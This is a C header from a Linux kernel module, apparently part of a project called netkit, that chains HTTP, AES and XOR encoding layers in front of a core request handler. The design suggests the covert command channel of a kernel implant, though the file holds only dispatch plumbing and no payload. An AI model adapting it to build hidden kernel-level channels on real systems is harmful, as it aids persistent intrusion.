#ifndef ENCODING__IFACE_H
#define ENCODING__IFACE_H

#include <linux/types.h>
#include <linux/kallsyms.h>

#include "../sys/debug.h"
#include "../sys/mem.h"
#include "../core/iface.h"

static inline int call_next_encoding(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index);

#include "xor/xor.h"
#include "aes/aes.h"
#include "http/http.h"

static inline int enc_last_process(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index)
{
    return core_process(req_buf, req_buflen, res_buf, res_buflen);
}

static int (*ENC_FUNCTIONS[])(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index) = {
    enc_http_process,
    enc_aes_process,
    enc_xor_process,
    enc_last_process
};


static inline int call_next_encoding(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index)
{
    int retv;

#if CONFIG_NETKIT_DEBUG
    char *sym_name;

    // for some reason symbol names are this big???
    sym_name = kzmalloc(1024, GFP_KERNEL);
    if (IS_ERR(sym_name))
        return PTR_ERR(sym_name);

    retv = sprint_symbol(sym_name, (unsigned long)ENC_FUNCTIONS[index]);
    if (retv < 0)
        return retv;

    NETKIT_LOG("[*] calling '%s' (req_buflen: %lu)\n", sym_name, req_buflen);
#endif
    retv = ENC_FUNCTIONS[index](req_buf, req_buflen, res_buf, res_buflen, index);
#if CONFIG_NETKIT_DEBUG
    NETKIT_LOG("[+] returned '%s' (res_buflen: %lu, retv: %d)\n", sym_name, *res_buflen, retv);

    kzfree(sym_name, 1024);
#endif

    return retv;
}

//extern int (*ENC_FUNCTIONS[])(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index);

static inline int enc_process(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    call_next_encoding(req_buf, req_buflen, res_buf, res_buflen, 0);

    return 0;
}


#endif
